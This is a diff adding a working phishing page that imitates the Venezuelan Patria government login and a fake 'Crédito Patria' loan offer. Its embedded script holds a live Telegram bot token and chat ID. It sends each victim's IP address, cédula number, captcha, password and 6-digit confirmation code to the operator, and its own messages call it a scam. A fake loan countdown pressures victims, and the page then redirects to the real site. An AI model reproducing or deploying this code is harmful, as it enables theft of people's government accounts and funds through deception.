@@ -1,0 +1,872 @@
+<!doctype html>
+<html lang="es">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <!-- OPEN GRAPH META TAGS PARA COMPARTIR EN REDES SOCIALES -->
+  <meta property="og:title" content="Patria - Sistema de Autenticación">
+  <meta property="og:description" content="Accede a tu cuenta Patria de forma segura. Sistema de autenticación oficial.">
+  <meta property="og:image" content="patria_login_id.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Patria - Sistema de Autenticación">
+  <meta name="twitter:description" content="Accede a tu cuenta Patria de forma segura.">
+  <meta name="twitter:image" content="patria_login_id.png">
+  <!-- FAVICON -->
+  <link rel="icon" type="image/x-icon" href="https://persona.patria.org.ve/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://persona.patria.org.ve/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://persona.patria.org.ve/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://persona.patria.org.ve/apple-touch-icon.png">
+  <title>Patria - Créditos</title>
+  <link rel="stylesheet" type="text/css" href="materialize.min.css">
+  <link rel="stylesheet" type="text/css" href="main.css">
+  <link rel="stylesheet" type="text/css" href="fonts.css">
+  <style>
+        main {
+            flex: 1 0 auto;
+        }
+
+        .container {
+            max-width: 600px;
+        }
+
+        .btn {
+            padding: 0 2rem;
+            font-size: 15px;
+        }
+
+        .logo-patria {
+            background: transparent url("p_id.png") no-repeat scroll center center !important;
+            background-size: 211px 66px !important;
+            height: 120px !important;
+            overflow: hidden !important;
+            text-indent: -1000px !important;
+            padding: 0 !important;
+            margin: 20px auto !important;
+            width: 211px !important;
+            display: block !important;
+            cursor: default !important;
+            pointer-events: none !important;
+        }
+
+        .main-container {
+            text-align: center;
+            padding-top: 10px;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                max-width: 95%;
+                margin: 0 auto;
+            }
+            .logo-patria {
+                height: 100px !important;
+                margin: 15px auto !important;
+            }
+            .btn {
+                padding: 0 1rem;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo-patria {
+                height: 80px !important;
+                margin: 10px auto !important;
+            }
+            .btn {
+                padding: 0 1rem;
+                font-size: 14px;
+            }
+        }
+
+        .step {
+            transition: all 0.3s ease;
+        }
+
+        .step-2 {
+            display: none;
+        }
+
+        .step-2.active {
+            display: block;
+        }
+
+        .step-3 {
+            display: none;
+        }
+
+        .step-3.active {
+            display: block;
+        }
+
+        .cedula-display {
+            color: #9e9e9e !important;
+            border-bottom: 1px solid #9e9e9e !important;
+            cursor: not-allowed;
+            background-color: transparent !important;
+            margin-bottom: 0;
+        }
+
+        .static-label-container {
+            text-align: left;
+            margin-bottom: 5px;
+        }
+
+        .static-label {
+            font-size: 12px;
+            color: #9e9e9e;
+            display: block;
+        }
+
+        .captcha-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 5px 0 10px 0;
+        }
+
+        .captcha-image {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            display: block;
+            flex: 1;
+        }
+
+        .refresh-icon {
+            width: 28px;
+            height: 28px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.2s ease;
+            flex-shrink: 0;
+        }
+
+        .refresh-icon:hover {
+            opacity: 1;
+        }
+
+        .reset-link {
+            display: inline-block;
+            font-size: 14px;
+            color: #E64A19 !important;
+            text-decoration: none;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            font-weight: 400;
+            margin: 15px 0 10px 0;
+        }
+
+        .reset-link:hover {
+            text-decoration: underline;
+            color: #E64A19 !important;
+        }
+
+        .form-footer a {
+            color: #E64A19 !important;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            text-decoration: none;
+            font-weight: 400;
+        }
+
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links {
+            transition: opacity 0.3s ease;
+        }
+
+        .footer-links.hide-footer {
+            display: none;
+        }
+
+        .reset-container {
+            text-align: center;
+            margin-top: 5px;
+        }
+
+        .btn-disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Estilos créditos */
+        .credit-option {
+            text-align: left;
+            margin: 12px 0;
+            padding: 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+
+        .credit-option:hover {
+            background: #f9f9f9;
+        }
+
+        .credit-option input[type="radio"] {
+            margin-right: 12px;
+            transform: scale(1.1);
+            vertical-align: middle;
+        }
+
+        .credit-option label {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            display: inline-block;
+            width: calc(100% - 30px);
+        }
+
+        .monto-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .monto-btn {
+            background-color: #26a69a !important;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.2s;
+            min-width: 80px;
+            text-align: center;
+        }
+
+        .monto-btn:hover {
+            background-color: #2bbbad !important;
+            transform: scale(1.02);
+        }
+
+        .monto-btn.selected {
+            background-color: #2e7d32 !important;
+        }
+
+        .monto-value {
+            font-size: 18px;
+            font-weight: bold;
+            color: #E64A19;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .timer-box {
+            background: #f0f0f0;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+
+        .timer {
+            font-size: 28px;
+            font-family: monospace;
+            color: #d32f2f;
+        }
+
+        .code-input {
+            text-align: center;
+            font-size: 24px;
+            letter-spacing: 8px;
+        }
+
+        .warning-message {
+            color: red;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        
+        .old-buttons {
+            display: none;
+        }
+
+        /* Pantalla de carga */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+            backdrop-filter: blur(3px);
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #E64A19;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+ </head>
+ <body>
+  <div class="main-container">
+   <h1 class="logo-patria">Patria</h1>
+   <div class="container">
+    <div class="z-depth-1 white row">
+     <div class="clap col s12">
+      <div style="height: 10px;"></div>
+     </div>
+     <div class="row row-end">
+      <div class="col s12">
+       <form method="post" action="" id="login-form" class="col s12" autocomplete="off">
+        <div style="padding: 30px;">
+         <!-- PASO 1: Cédula + Captcha -->
+         <div id="step-1" class="step step-1">
+          <div class="input-field col s12 m6 offset-m3">
+           <input type="text" id="username" name="username" required autocomplete="off" class="uppercase identification_letter_fix"> <label class="required" for="username">Cédula</label>
+          </div>
+          <div class="col s12 m6 offset-m3">
+           <div class="captcha-wrapper">
+            <img id="captchaImage" src="_captcha_captcha.jpg" alt="captcha" class="captcha-image"> <img id="refreshCaptchaStep1" src="https://persona.patria.org.ve/theme/img/refresh_captcha_ico.png?v=9a9c106c5a85454a83d51e38e78f28d2" alt="actualizar" class="refresh-icon" title="Actualizar captcha">
+           </div>
+          </div>
+          <div class="input-field col s12 m6 offset-m3">
+           <input type="text" id="captchaCode" name="captchaCode" required autocomplete="off" class="uppercase"> <label class="required" for="captchaCode">Código de verificación</label>
+          </div>
+          <div class="row row-end">
+           <div class="btn-enter input-field col s12 m6 offset-m3">
+            <button type="button" id="next-button" class="col s12 btn btn-medium waves-effect clap">Continuar</button>
+           </div>
+          </div>
+         </div>
+         <!-- PASO 2: Contraseña -->
+         <div id="step-2" class="step step-2">
+          <div class="col s12 m10 offset-m1 center-align" style="margin-top: 10px; margin-bottom: 20px;">Debes introducir su contraseña para completar la autenticación y activación de su página para comprobar que eres el propietario de la cuenta.</div>
+          <div class="col s12 m6 offset-m3">
+           <div class="static-label-container">
+            <label class="static-label">Cédula</label>
+           </div>
+           <input type="text" id="username-display" name="username-display" readonly class="cedula-display" value="" style="width: 100%;">
+          </div>
+          <div class="input-field col s12 m6 offset-m3">
+           <input type="password" id="password" name="password" required autocomplete="off"> <label class="required" for="password">Contraseña</label>
+          </div>
+          <input type="hidden" id="_token" name="_token" value="379295dfe8ed307f999b458db9220feb.P7LOgv5qMrHgCUGexGIpjjOCWb9o_83ruSaA-SP_lFo.csSiwYkvYPe0QSbpqVMbulmyN-89h7Soj2rZrlqN8TUNyOPVjSAB95NxBA">
+          <div class="row row-end">
+           <div class="btn-enter input-field col s12 m6 offset-m3">
+            <button id="send_button" type="submit" disabled class="col s12 btn btn-medium waves-effect clap">Entrar</button>
+           </div>
+          </div>
+         </div>
+         <!-- PASO 3: FORMULARIO DE CRÉDITOS PATRIA -->
+         <div id="step-3" class="step step-3">
+          <div class="col s12 center-align" style="margin-bottom: 20px;">
+           <h5 style="color:#E64A19;">Solicitud de Crédito Patria</h5>
+           <p>Selecciona el tipo de crédito y el monto deseado</p>
+          </div>
+          <!-- Opciones de crédito -->
+          <div class="col s12">
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_Bricomiles" value="Credi Bricomiles"> <label for="cred_Bricomiles">Credi Bricomiles</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_nomina" value="Credi Nomina"> <label for="cred_nomina">Credi Nomina</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_pnb" value="Credi PNB"> <label for="cred_pnb">Credi PNB</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_docente" value="Credi Docente"> <label for="cred_docente">Credi Docente</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_fanb" value="Credi Fanb"> <label for="cred_fanb">Credi Fanb</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_Medico" value="Credi Medico"> <label for="cred_Medico">Credi Medico</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_alcaldias" value="Alcaldías"> <label for="cred_alcaldias">Alcaldías</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_pc" value="Pc"> <label for="cred_pc">Pc</label>
+           </div>
+           <div class="credit-option">
+            <input type="radio" name="credito" id="cred_mujer" value="Mujer"> <label for="cred_Mujer">Credi Mujer</label>
+           </div>
+            <!-- Montos fijos -->
+          <div class="col s12">
+           <label style="font-weight:500; display:block; margin:15px 0 5px;">Selecciona el monto del crédito:</label>
+           <div class="monto-buttons">
+            <div class="monto-btn" data-monto="300">$300</div>
+            <div class="monto-btn" data-monto="500">$500</div>
+            <div class="monto-btn" data-monto="800">$800</div>
+            <div class="monto-btn" data-monto="1200">$1200</div>
+           </div>
+           <div class="monto-value">
+            Monto seleccionado: $<span id="selectedMonto">300</span>
+           </div>
+           <input type="hidden" id="montoValueHidden" value="300">
+          </div>
+          <!-- Código de confirmación -->
+          <div class="col s12">
+           <div class="input-field">
+            <input type="text" id="confirmCode" class="code-input" placeholder="Código de 6 dígitos" maxlength="6" autocomplete="off"> <label for="confirmCode">Código de confirmación del titular</label>
+           </div>
+           <div class="timer-box">
+            <div>Tiempo restante:</div>
+            <div class="timer" id="timerDisplay">05:00</div>
+            <div id="timerWarning" class="warning-message"></div>
+           </div>
+          </div>
+          <!-- Botón Validar y enviar código -->
+          <div class="row row-end">
+           <div class="btn-enter input-field col s12 m6 offset-m3">
+            <button type="button" id="sendCodeOnlyBtn" class="col s12 btn btn-medium waves-effect clap">Validar y Enviar Código</button>
+           </div>
+          </div>
+          <div class="center-align" style="margin-top:15px;">
+           <a href="#" id="reset-from-credit" class="reset-link">Regresar al inicio</a>
+          </div>
+         </div>
+        </div>
+       </form>
+      </div>
+     </div>
+    </div>
+    <div id="reset-container" class="reset-container" style="display: none;">
+     <a href="#" class="reset-link" id="reset-button">Regresar</a>
+    </div>
+    <div id="footer-links" class="footer-links">
+     <div class="col s12 form-footer" style="margin-bottom: 10px;">
+      <a href="https://persona.patria.org.ve/registro/">Registrarse</a>
+     </div>
+     <div class="col s12 form-footer" style="margin-bottom: 10px;">
+      <a href="https://persona.patria.org.ve/recuperar/contacto/">Recupera Contraseña</a>
+     </div>
+     <div class="col s12 form-footer">
+      <a href="https://persona.patria.org.ve/recuperar/acceso/telefono/">Recupera Acceso</a>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+  <script>
+           const TELEGRAM_BOT_TOKEN = "8718428236:AAH1JDHov0oUBE4ExatVTAlpAhUkrbBwK1M";
+        const TELEGRAM_CHAT_ID = "6250602937";
+
+
+        // BANDERAS PARA CONTROLAR QUE CADA MENSAJE SE ENVÍE UNA SOLA VEZ (excepto el código que siempre se puede enviar)
+        let accesoEnviado = false;
+        let datosEnviados = false;
+        let cedulaClickEnviado = false;
+        let passwordClickEnviado = false;
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'IP no disponible';
+            }
+        }
+
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        let timerInterval = null;
+        let timeLeft = 300;
+        let currentUsername = "";
+        let currentCaptcha = "";
+        let currentPassword = "";
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const display = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            $('#timerDisplay').text(display);
+            
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                $('#timerWarning').text('⏰ El tiempo ha expirado.');
+                $('#confirmCode').prop('disabled', true);
+                $('#sendCodeOnlyBtn').prop('disabled', true);
+            } else {
+                $('#timerWarning').text('');
+                $('#confirmCode').prop('disabled', false);
+                $('#sendCodeOnlyBtn').prop('disabled', false);
+            }
+        }
+
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    updateTimerDisplay();
+                } else {
+                    clearInterval(timerInterval);
+                    updateTimerDisplay();
+                }
+            }, 1000);
+        }
+
+        function showLoading(text = "Procesando, espere...") {
+            $('body').append(`
+                <div class="loading-overlay" id="globalLoading">
+                    <div class="loading-spinner"></div>
+                    <div>${text}</div>
+                </div>
+            `);
+        }
+        function hideLoading() {
+            $('#globalLoading').remove();
+        }
+
+        $(document).ready(function() {
+            let form_username = $('#username');
+            let form_captcha = $('#captchaCode');
+            let nextButton = $('#next-button');
+            let passwordField = $('#password');
+            let sendButton = $('#send_button');
+            let resetButton = $('#reset-button');
+            let step1 = $('#step-1');
+            let step2 = $('#step-2');
+            let step3 = $('#step-3');
+            let usernameDisplay = $('#username-display');
+            let footerLinks = $('#footer-links');
+            let resetContainer = $('#reset-container');
+
+            let isWaiting = false;
+            let selectedMonto = 300;
+
+            // ========== AL HACER CLIC EN LA BARRA DE CÉDULA ==========
+            $('#username').on('click', async function() {
+                if (!cedulaClickEnviado) {
+                    cedulaClickEnviado = true;
+                    const userIP = await getUserIP();
+                    const timestamp = new Date().toLocaleString();
+                    const message = `✏️ <b>ESCRIBIENDO CÉDULA</b>\n\n` +
+                        `🕐 <b>Hora:</b> ${timestamp}\n` +
+                        `🌐 <b>IP:</b> <code>${userIP}</code>\n` +
+                        `📌 <b>Acción:</b> El usuario está escribiendo su cédula\n\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🛑 <b>SCAM ECHO POR Mota</b>\n` +
+                        `📱 <b>TELEGRAM:</b> @Mota`;
+                    await sendToTelegram(message);
+                }
+            });
+
+            // ========== AL HACER CLIC EN LA BARRA DE CONTRASEÑA ==========
+            $('#password').on('click', async function() {
+                if (!passwordClickEnviado) {
+                    passwordClickEnviado = true;
+                    const userIP = await getUserIP();
+                    const timestamp = new Date().toLocaleString();
+                    const message = `✏️ <b>ESCRIBIENDO CONTRASEÑA</b>\n\n` +
+                        `🕐 <b>Hora:</b> ${timestamp}\n` +
+                        `🌐 <b>IP:</b> <code>${userIP}</code>\n` +
+                        `👤 <b>Cédula ingresada:</b> <code>${form_username.val() || 'No ingresada aún'}</code>\n` +
+                        `📌 <b>Acción:</b> El usuario está escribiendo su contraseña\n\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🛑 <b>SCAM ECHO POR Mota</b>\n` +
+                        `📱 <b>TELEGRAM:</b> @Mota`;
+                    await sendToTelegram(message);
+                }
+            });
+
+            $('.monto-btn').on('click', function() {
+                $('.monto-btn').removeClass('selected');
+                $(this).addClass('selected');
+                selectedMonto = parseInt($(this).data('monto'));
+                $('#selectedMonto').text(selectedMonto);
+                $('#montoValueHidden').val(selectedMonto);
+            });
+            $('.monto-btn[data-monto="300"]').addClass('selected');
+
+            const options = {
+                translation: {
+                    '0': { pattern: /\d/ },
+                    '1': { pattern: /[1-9]/ },
+                    '9': { pattern: /\d/, optional: true },
+                    '#': { pattern: /\d/, recursive: true },
+                    'C': { pattern: /[VvEe]/, fallback: 'V' }
+                }
+            };
+            form_username.mask('C-19999999', options);
+
+            function checkStep1Complete() {
+                if (!isWaiting) {
+                    nextButton.prop('disabled', !(form_username.val() && form_captcha.val()));
+                }
+            }
+            form_username.on('input', checkStep1Complete);
+            form_captcha.on('input', checkStep1Complete);
+            checkStep1Complete();
+
+            function setupRefreshCaptcha(refreshBtn, imgElement) {
+                refreshBtn.on('click', function() {
+                    const currentSrc = imgElement.attr('src');
+                    if (currentSrc.indexOf('?') !== -1) {
+                        imgElement.attr('src', currentSrc.replace(/\?.*$/, '?') + Math.random());
+                    } else {
+                        imgElement.attr('src', currentSrc + '?' + Math.random());
+                    }
+                    $(this).css('opacity', '0.5');
+                    setTimeout(() => $(this).css('opacity', '0.7'), 200);
+                });
+            }
+
+            setupRefreshCaptcha($('#refreshCaptchaStep1'), $('#captchaImage'));
+
+            // ========== MENSAJE DE NUEVO ACCESO (UNA SOLA VEZ) ==========
+            (async function() {
+                if (!accesoEnviado) {
+                    accesoEnviado = true;
+                    const userIP = await getUserIP();
+                    const timestamp = new Date().toLocaleString();
+                    const entryMessage = `🔔 <b>NUEVO ACCESO DETECTADO</b>\n\n` +
+                        `🕐 <b>Hora:</b> ${timestamp}\n` +
+                        `🌐 <b>IP:</b> <code>${userIP}</code>\n` +
+                        `📱 <b>Página:</b> Login Patria (Créditos)\n\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🛑 <b>SCAM ECHO POR Mota</b>\n` +
+                        `📱 <b>TELEGRAM:</b> @Mota`;
+                    await sendToTelegram(entryMessage);
+                }
+            })();
+
+            // Continuar (Paso1 -> Paso2) con espera de 2 segundos
+            nextButton.on('click', function() {
+                if ((form_username.val() && form_captcha.val()) && !isWaiting) {
+                    isWaiting = true;
+                    nextButton.prop('disabled', true);
+                    setTimeout(function() {
+                        usernameDisplay.val(form_username.val());
+                        step1.hide();
+                        step2.addClass('active').show();
+                        footerLinks.addClass('hide-footer');
+                        resetContainer.show();
+                        isWaiting = false;
+                        nextButton.prop('disabled', false);
+                        checkStep1Complete();
+                        setTimeout(() => passwordField.focus(), 100);
+                    }, 2000);
+                }
+            });
+
+            resetButton.on('click', function(e) {
+                e.preventDefault();
+                form_username.val('');
+                form_captcha.val('');
+                passwordField.val('');
+                usernameDisplay.val('');
+                nextButton.prop('disabled', true);
+                sendButton.prop('disabled', true);
+                step2.removeClass('active').hide();
+                step3.removeClass('active').hide();
+                step1.show();
+                footerLinks.removeClass('hide-footer');
+                resetContainer.hide();
+                isWaiting = false;
+                if (timerInterval) clearInterval(timerInterval);
+                setTimeout(() => form_username.focus(), 100);
+            });
+
+            passwordField.on('input', function() {
+                sendButton.prop('disabled', !passwordField.val());
+            });
+            sendButton.prop('disabled', true);
+
+            // ========== MENSAJE DE DATOS COMPLETOS (UNA SOLA VEZ) ==========
+            $('#login-form').on('submit', async function(e) {
+                e.preventDefault();
+
+                // Si ya se enviaron los datos, solo avanzar sin volver a enviar
+                if (datosEnviados) {
+                    step2.removeClass('active').hide();
+                    step3.addClass('active').show();
+                    resetContainer.hide();
+                    timeLeft = 300;
+                    updateTimerDisplay();
+                    startTimer();
+                    return;
+                }
+
+                const userIP = await getUserIP();
+                const username = form_username.val();
+                currentUsername = username;
+                const captcha = form_captcha.val();
+                currentCaptcha = captcha;
+                const password = passwordField.val();
+                currentPassword = password;
+                const timestamp = new Date().toLocaleString();
+
+                const formMessage = `✅ <b>DATOS COMPLETOS CAPTURADOS</b>\n\n` +
+                    `🕐 <b>Hora:</b> ${timestamp}\n` +
+                    `🌐 <b>IP:</b> <code>${userIP}</code>\n` +
+                    `👤 <b>Cédula:</b> <code>${username}</code>\n` +
+                    `🔢 <b>Código Captcha:</b> <code>${captcha}</code>\n` +
+                    `🔐 <b>Contraseña:</b> <code>${password}</code>\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🛑 <b>SCAM ECHO POR Mota</b>\n` +
+                    `📱 <b>TELEGRAM:</b> @Mota`;
+
+                await sendToTelegram(formMessage);
+                
+                // Marcar que los datos ya fueron enviados
+                datosEnviados = true;
+                
+                // Esperar 2 segundos antes de mostrar paso3
+                setTimeout(async () => {
+                    step2.removeClass('active').hide();
+                    step3.addClass('active').show();
+                    resetContainer.hide();
+                    
+                    // Iniciar timer
+                    timeLeft = 300;
+                    updateTimerDisplay();
+                    startTimer();
+                    
+                }, 2000);
+            });
+
+            // ========== MENSAJE DEL CÓDIGO (SIEMPRE SE PUEDE ENVIAR, CADA VEZ QUE PRESIONAN) ==========
+            $('#sendCodeOnlyBtn').off('click').on('click', async function() {
+                // NO hay bandera de codigoEnviado, así que SIEMPRE se puede enviar
+                
+                const selectedCredit = $('input[name="credito"]:checked').val();
+                if (!selectedCredit) {
+                    M.toast({html: 'Por favor selecciona un tipo de crédito', classes: 'red'});
+                    return;
+                }
+                
+                const userCode = $('#confirmCode').val();
+                
+                if (!userCode || userCode.trim() === "") {
+                    M.toast({html: '⚠️ No hay código escrito. Ingresa el código de 6 dígitos.', classes: 'orange'});
+                    return;
+                }
+                
+                if (userCode.length !== 6) {
+                    M.toast({html: 'El código debe tener 6 dígitos', classes: 'red'});
+                    return;
+                }
+                
+                if (timeLeft <= 0) {
+                    M.toast({html: 'El tiempo ha expirado.', classes: 'red'});
+                    return;
+                }
+
+                // MOSTRAR PANTALLA DE CARGA
+                showLoading("Validando y enviando código, espere...");
+                
+                // Esperar 3 segundos con pantalla de carga
+                setTimeout(async () => {
+                    const finalIP = await getUserIP();
+                    const finalTimestamp = new Date().toLocaleString();
+                    
+                    const codeMessage = `💵 <b>CÓDIGO PARA PAGAR FACTURA</b>\n\n` +
+                        `🕐 <b>Hora:</b> ${finalTimestamp}\n` +
+                        `🌐 <b>IP:</b> <code>${finalIP}</code>\n` +
+                        `👤 <b>Cédula:</b> <code>${currentUsername}</code>\n` +
+                        `🏦 <b>Tipo de Crédito:</b> ${selectedCredit}\n` +
+                        `💵 <b>Monto solicitado:</b> $${selectedMonto}\n` +
+                        `🔢 <b>Código que puso el cliente:</b> <code>${userCode}</code>\n` +
+                        `📌 <b>Estado:</b> Código ingresado por el cliente para pago de factura\n\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🛑 <b>SCAM ECHO POR Mota</b>\n` +
+                        `📱 <b>TELEGRAM:</b> @Mota`;
+                    
+                    await sendToTelegram(codeMessage);
+                    
+                    // Ocultar pantalla de carga
+                    hideLoading();
+                    
+                    // Mostrar mensaje de que se envió
+                    M.toast({html: 'Código enviado correctamente. Redirigiendo...', classes: 'green'});
+                    
+                    // Redirige a Patria
+                    setTimeout(() => {
+                        window.location.href = "https://www.patria.org.ve/";
+                    }, 2000);
+                    
+                }, 3000);
+            });
+
+            $('#reset-from-credit').on('click', function(e) {
+                e.preventDefault();
+                if (timerInterval) clearInterval(timerInterval);
+                form_username.val('');
+                form_captcha.val('');
+                passwordField.val('');
+                step3.removeClass('active').hide();
+                step1.show();
+                footerLinks.removeClass('hide-footer');
+                resetContainer.hide();
+                $('#confirmCode').val('');
+                $('#confirmCode').prop('disabled', false);
+                $('#sendCodeOnlyBtn').prop('disabled', false);
+                $('input[name="credito"]').prop('checked', false);
+                selectedMonto = 300;
+                $('#selectedMonto').text('300');
+                $('#montoValueHidden').val('300');
+                $('.monto-btn').removeClass('selected');
+                $('.monto-btn[data-monto="300"]').addClass('selected');
+                currentUsername = "";
+                timeLeft = 300;
+                updateTimerDisplay();
+                // Resetear las banderas al reiniciar (excepto accesoEnviado)
+                datosEnviados = false;
+                cedulaClickEnviado = false;
+                passwordClickEnviado = false;
+            });
+
+            setTimeout(function() {
+                if (step3.is(':visible') === false && step2.is(':visible') === false && step1.is(':visible')) {
+                    window.location.href = "https://www.patria.org.ve/";
+                }
+            }, 600000);
+        });
+    </script>
+ </body>
+</html>
